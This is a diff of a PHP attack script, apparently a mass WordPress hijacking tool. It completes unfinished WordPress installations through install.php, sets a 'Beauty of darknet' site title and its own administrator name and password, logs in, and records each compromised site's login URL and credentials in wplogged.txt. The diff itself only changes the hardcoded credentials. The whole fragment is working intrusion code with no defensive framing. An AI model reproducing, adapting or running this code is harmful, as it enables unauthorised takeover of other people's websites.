@@ -94,16 +94,16 @@ function wpI($install)
     	$lang = getCurl($install.'/wp-admin/install.php?language=en_US');
     	$sS = postCurl($install.'/wp-admin/install.php?step=2',[
     		'weblog_title' => 'Beauty of darknet', 
-    		'user_name' => 'root',                
-    		'admin_password' => 'toorInstall',   
-    		'admin_password2' => 'toorInstall',   
+    		'user_name' => 'kang',                
+    		'admin_password' => 'klep0n',   
+    		'admin_password2' => 'klep0n',   
     		'admin_email' => 'toor@ro.ot',    
     		'blog_public' => '1',
     		'Submit' => 'Install Wordpress',
     		'language' => 'en_US']);
     	$login = postCurl($install,'/wp-login.php',[
-    		'log' => 'root',
-    		'pwd' => 'toorInstall',
+    		'log' => 'kang',
+    		'pwd' => 'klep0n',
     		'wp-submit' => 'Log In',
     		'redirect_to' => $install.'/wp-admin/',
     		'testcookie' =>'1']);
@@ -111,11 +111,11 @@ function wpI($install)
     	$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
     	$admti = implode("", $matches[1]);
     	if (preg_match_all("/Beauty/",$admti)) {
-    		echo "  $install/wp-login.php|root|toorInstall\n";
+    		echo "  $install/wp-login.php|kang|klep0n\n";
     		$r = "wplogged.txt";
     		touch($r);
     		$w = fopen($r, "a");
-    		$site = $install.'/wp-login.php|root|toorInstall';
+    		$site = $install.'/wp-login.php|kang|klep0n';
     		fwrite($w, $site."\n");
     		fclose($w);	
     	}else{
